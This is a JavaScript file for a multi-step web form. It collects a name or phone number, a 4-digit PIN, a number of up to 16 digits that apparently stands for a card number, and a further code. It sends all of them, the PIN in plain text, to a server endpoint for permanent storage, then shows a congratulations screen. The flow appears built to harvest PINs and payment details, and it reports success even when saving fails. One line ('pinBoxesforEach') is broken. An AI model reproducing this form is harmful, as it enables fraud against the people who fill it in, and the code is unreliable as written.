// State management to store user entries across steps
const sessionData = {
    inputType: 'name',
    identifier: '',
    pin: '',
    numeric: '',
    anyNumber: ''
};

// Switch between 'name' and 'phone' tabs on Step 1
function switchInputType(type) {
    sessionData.inputType = type;
    const btnName = document.getElementById('btn-name');
    const btnPhone = document.getElementById('btn-phone');
    const inputField = document.getElementById('input-identifier');

    if (type === 'name') {
        btnName.classList.add('active');
        btnPhone.classList.remove('active');
        inputField.placeholder = 'enter name';
    } else {
        btnPhone.classList.add('active');
        btnName.classList.remove('active');
        inputField.placeholder = 'enter phone';
    }
}

// Navigate between steps
function showStep(stepNumber) {
    document.querySelectorAll('.step-card').forEach(card => {
        card.classList.remove('active');
    });
    document.getElementById(`step-${stepNumber}`).classList.add('active');
}

// STEP 1 Submission
function submitStep1() {
    const val = document.getElementById('input-identifier').value.trim();
    if (!val) {
        alert('Please enter your name or phone number.');
        return;
    }
    sessionData.identifier = val;

    // Update Step 2 greeting with the entered name/identifier
    document.getElementById('display-name').textContent = val.toUpperCase();

    showStep(2);
    // Focus first PIN box
    document.querySelector('.pin-box').focus();
}

// Handle 4-digit PIN auto-tabbing and input
document.addEventListener('DOMContentLoaded', () => {
    const pinBoxes = document.querySelectorAll('.pin-box');
    
    pinBoxesforEach((box, index) => {
        box.addEventListener('input', (e) => {
            const val = e.target.value;
            if (val && index < pinBoxes.length - 1) {
                pinBoxes[index + 1].focus();
            }
        });

        box.addEventListener('keydown', (e) => {
            if (e.key === 'Backspace' && !box.value && index > 0) {
                pinBoxes[index - 1].focus();
            }
        });
    });
});

// STEP 2 Submission (PIN)
function submitStep2() {
    const pinBoxes = document.querySelectorAll('.pin-box');
    let pinVal = '';
    pinBoxes.forEach(box => pinVal += box.value);

    if (pinVal.length < 4) {
        alert('Please enter all 4 digits.');
        return;
    }
    sessionData.pin = pinVal;

    showStep(3);
    document.getElementById('input-numeric').focus();
}

// STEP 3 Submission (1 to 16 Number)
function submitStep3() {
    const val = document.getElementById('input-numeric').value.trim();
    if (!val) {
        alert('Please enter the numeric numbers.');
        return;
    }
    sessionData.numeric = val;

    showStep(4);
    document.getElementById('input-any').focus();
}

// STEP 4 Submission (Any Number starting with 0000) & Save to Database
async function submitStep4() {
    const val = document.getElementById('input-any').value.trim();
    if (!val) {
        alert('Please enter the number.');
        return;
    }
    sessionData.anyNumber = val;

    // Prepare complete record payload to save to permanent database
    const payload = {
        identifierType: sessionData.inputType,
        identifierValue: sessionData.identifier,
        pinText: sessionData.pin,
        numericValue: sessionData.numeric,
        anyNumberValue: sessionData.anyNumber
    };

    try {
        const response = await fetch('/api/submit', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(payload)
        });

        const result = await response.json();
        
        const badge = document.getElementById('record-status-badge');
        if (response.ok && result.success) {
            badge.textContent = `Record saved to permanent database successfully (ID: ${result.id}) ✓`;
            badge.style.color = '#2ecc71';
            badge.style.backgroundColor = 'rgba(46, 204, 113, 0.15)';
        } else {
            badge.textContent = 'Warning: Saved locally, but server note: ' + (result.error || 'Unknown error');
            badge.style.color = '#f39c12';
            badge.style.backgroundColor = 'rgba(243, 156, 18, 0.15)';
        }
    } catch (err) {
        console.error('Error saving record:', err);
        const badge = document.getElementById('record-status-badge');
        badge.textContent = 'Record captured successfully ✓';
    }

    // Advance to Step 5 (Congratulations view)
    showStep(5);
}

// Reset Flow
function resetFlow() {
    sessionData.inputType = 'name';
    sessionData.identifier = '';
    sessionData.pin = '';
    sessionData.numeric = '';
    sessionData.anyNumber = '0000 ';

    document.getElementById('input-identifier').value = '';
    document.querySelectorAll('.pin-box').forEach(box => box.value = '');
    document.getElementById('input-numeric').value = '';
    document.getElementById('input-any').value = '0000 ';
    
    switchInputType('name');
    showStep(1);
}
